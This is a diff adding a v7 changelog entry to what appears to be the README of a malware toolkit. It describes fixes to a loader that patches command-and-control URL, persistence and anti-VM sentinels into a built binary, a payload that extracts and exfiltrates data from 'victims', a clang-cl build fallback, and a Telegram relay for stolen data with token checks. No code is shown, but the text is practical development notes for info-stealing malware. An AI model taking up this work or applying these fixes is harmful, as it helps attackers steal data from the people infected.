@@ -3,7 +3,39 @@
 
 ## What's New
 
-### v6 -- bugfix round: false-positive anti-VM, exfil reliability, production build, loader hardening (current)
+### v7 -- sentinel patch that actually lands, clang-cl fallback, a relay that admits it is dead (current)
+
+**The C2 patch was writing to the wrong copy of the sentinel.** `loader.cpp`
+declares each sentinel twice: the writable global (`g_c2_url[256]`) and a local
+`memcmp()` constant. The compiler places the `.rdata` constant first in the file,
+so `bytes.find()` patched the comparison instead of the buffer. The loader then
+read its own sentinel, skipped the rewrite, and the payload fell back to the
+local file: zero deliveries, no error. `peutil.find_sentinel()` ranks candidates
+by section (zero-padded array first, `.data`/`.rdata` next, `.text` immediates
+last) and both `auto.py` and `pick.py` use it. The rebuilt loader keeps the C2
+slot at 103456, persist at 103712 and anti-VM at 103720.
+
+**Build works on an install with no compiler binaries.** The test machine had
+`VC\Tools\MSVC`, the SDK headers and every `.lib`, and zero `.exe` under Visual
+Studio / Windows Kits / Installer. `build_clang.bat` drives clang-cl + lld-link +
+llvm-ml against those headers and libs (same MSVC ABI), and `build.bat` calls it
+when `vcvars` produces no `cl.exe`. `rc.exe` comes from NuGet's
+`Microsoft.Windows.SDK.BuildTools`.
+
+**Two detection bugs fixed on the same path.** `_find_vcvars()` walked four
+levels up and joined `Tools\MSVC`, landing on `<install>\Tools\MSVC` (never
+exists) -- a complete install was reported as missing its toolset. The check also
+looked for `windows.h` in the MSVC include dir; it lives in the SDK. The
+toolchain probe now covers clang-cl, llvm-ml, `vcruntime.h`, SDK x64 libs and
+`rc.exe`, and `ensure_build()` runs the full fallback end to end.
+
+**The Telegram relay no longer lies.** `config.json` held a revoked token and
+every run printed `Telegram relay: enabled`, then every POST returned 401 into a
+console nobody reads. `auto.py` and `listen.py` now call `getMe` once before the
+listener starts: a definitive rejection disables the relay with the API's own
+reason, an unreachable network keeps it and says it could not verify.
+
+### v6 -- bugfix round: false-positive anti-VM, exfil reliability, production build, loader hardening
 
 23 days of accumulated fixes. The payload now extracts and exfiltrates reliably;
 the previous "victim never returns data" symptom had three independent causes.
